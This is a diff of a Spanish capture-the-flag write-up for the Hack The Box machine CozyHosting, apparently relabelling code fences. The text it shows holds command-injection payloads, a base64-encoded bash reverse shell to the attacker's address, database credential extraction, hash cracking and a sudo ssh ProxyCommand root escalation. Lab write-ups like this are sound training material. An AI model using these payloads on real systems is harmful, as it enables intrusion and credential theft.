@@ -23,7 +23,7 @@ sudo nmap -sCV -vvv -A -T5 -p- 10.10.11.230
 ```
 Se encuentran abiertos los puertos 22 y 80.
 Se realiza un escaneo enfocado a estos puertos de nuevo con nmap:
-```sh
+```shell
 sudo nmap -sCV -A -p22,80 10.10.11.230
 ```
 
@@ -43,13 +43,13 @@ sudo nmap -sCV -A -p22,80 10.10.11.230
 Encontramos información como la versión del ssh, el puerto 80 usa nginx
 ## Puerto 80
 Se realiza un escaneo al puerto 80 usando "whatweb".
-```sh
+```shell
 whatweb 10.10.11.230
 ```
 La parte que interesa es:
 RedirectLocation[**http://cozyhosting.htb**]
 Por lo tanto hay que agregar la página al archivo "/etc/hosts" usando el comando:
-```sh
+```shell
 sudo echo "10.10.11.230 cozyhosting.htb" | sudo tee -a /etc/hosts
 ```
 
@@ -63,7 +63,7 @@ El texto de error, sirve para buscar información acerca del mismo en la web.
 Se encuentra que el error está asociado a una tecnología llamada **spring boot**.
 
 Conociendo la tecnología, se realiza un fuzzing más específico a la página usando wfuzz.
-```sh
+```shell
 wfuzz -c --hc=403,404 -t 4 -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt -u http://cozyhosting.htb/FUZZ
 ```
 
@@ -87,24 +87,24 @@ Luego de enviar la solicitud analizamos la respuesta del servidor y al parecer e
 Intenta ejecutar el comando "ssh" usando como los datos proporcionados: partyhack en ambos casos.
 ## Probando PING
 Teniendo esa información podemos intentar ejecutar comandos en el sistema, usando, en este caso un "ping" a nuestra máquina con reemplazando la línea 15 de la solicitud:
-```sh
+```shell
 host=10.10.14.13&username=;ping${IFS}-c${IFS}4${IFS}10.10.14.13;
 ```
 
 No sin antes haber ejejctado "tcpdump" para poner en escucha con el protocolo ICMP:
-```sh
+```shell
 sudo tcpdump ip proto \\icmp -i tun0
 ```
 Ya en escucha, a ejecutar el ping se debería recibirlo como a continuación:
 ![Pasted image 20240224180231.png|700](/img/user/Pasted%20image%2020240224180231.png)
 ## Ejecutando la reverse shell
 Se pone en escucha a la máquina local usando netcat en el puerrto 4747 con lo siguiente:
-```sh
+```shell
 rlwrap nc -lnvp 4747
 ```
 
 Se reemplaza la línea con lo siguiente:
-```sh
+```shell
 host=10.10.14.13&username=;echo${IFS%??}"YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjEzLzQ3NDcgMD4mMSAg"${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
 ```
 Y se envía la solicitud, no sin antes aplicar un url-encode para asegurarse que no haya problemas al anviar los datos.
@@ -122,17 +122,17 @@ python3 -m http.server 4848
 ```
 
 En nuestra máquina lo traemos con un wget.
-```sh
+```shell
 wget 10.10.11.230:4848/cloudhosting-0.0.1.jar
 ```
 
 Una vez el archivo esté en el directorio local, descomprimirlo con:
-```sh
+```shell
 unzip cloudhosting-0.0.1.jar
 ```
 
 Acceder a la carpeta /BOOT-INF/classes y leer el archivo "application.properties"
-```sh
+```shell
 cat application.properties
 ```
 Encontramos las siguientes credenciales, nombre de la base de datos  y que es una base de datos "postgresql".
@@ -141,7 +141,7 @@ spring.datasource.username=**postgres**
 spring.datasource.password=**Vg&nvzAQ7XxR**
 
 Ingresamos a la base de datos con los siguientes datos e ingresamos la contraseña cuando se requiera.
-```sh
+```shell
 psql -h 127.0.0.1 -U postgres -d cozyhosting
 ```
 
@@ -152,14 +152,14 @@ Mostramos el contenido de las columnas de la tabla `user`
 ![Pasted image 20240226215454.png|700](/img/user/Pasted%20image%2020240226215454.png)
 
 Teniendo los hashes de las contraseñas, podemos usar fuerza bruta para descifrar el de el usuario `admin` que nos interesa más. Para esto se puede usar `johntheripper`
-```sh
+```shell
 john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash
 ```
 El tipo de hash es bcrypt.
 ![Pasted image 20240226221711.png|700](/img/user/Pasted%20image%2020240226221711.png)
 
 Ingresamos mediante `ssh` usando la contraseña y el usuario `josh`
-```sh
+```shell
 ssh josh@10.10.11.230 -p22
 ```
 
@@ -167,13 +167,13 @@ Y obtenemos la flag de user:
 ![Pasted image 20240226223120.png|400](/img/user/Pasted%20image%2020240226223120.png)
 # Escalada de privilegios
 Probamos si ejecutar algún comando como root:
-```sh
+```shell
 sudo -l
 ```
 
 Y vemos que se podemos ejecutar ssh como root.
 Por lo tanto escalamos privilegios usando ssh de la siguiente manera:
-```sh
+```shell
 sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
 ```
 
